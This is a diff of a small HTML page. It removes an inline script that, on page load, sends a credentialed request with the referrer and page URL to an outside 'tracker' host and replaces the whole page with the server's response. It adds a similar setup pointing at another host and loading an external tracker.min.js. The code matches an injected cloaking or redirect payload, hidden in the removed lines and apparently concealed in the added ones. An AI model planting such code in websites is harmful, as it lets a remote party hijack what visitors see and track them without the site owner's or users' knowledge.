@@ -3,29 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <title>Title</title>
-    <script>
-        var trackerHost = 'https://kangacdn.com';
-        var campaignId = "u5n75xyqhji";
 
-        document.addEventListener("DOMContentLoaded", function () {
-            var xhr = new XMLHttpRequest();
-            xhr.withCredentials = true;
-            xhr.open("GET", trackerHost + "/track/" + campaignId + "?referrer=" + escape(document.referrer) + "&uri=" + escape(window.location.href), true);
-            xhr.onload = function() {
-                if (xhr.status !== 200)
-                    return;
-
-                if (xhr.getResponseHeader("Struct-Response") !== "true") {
-                    document.open();
-                    document.write(xhr.responseText);
-                    document.close();
-                }
-            };
-            xhr.send();
-        });
+    <script type="text/javascript">
+        var trackerHost = 'https://fakecdn.net';
+        var campaignId = "u68gtk9kxsi";
     </script>
+    <script type="text/javascript" src="tracker.min.js"></script>
+
 </head>
 <body>
     <h1>Safe</h1>
- </body>
+</body>
 </html>
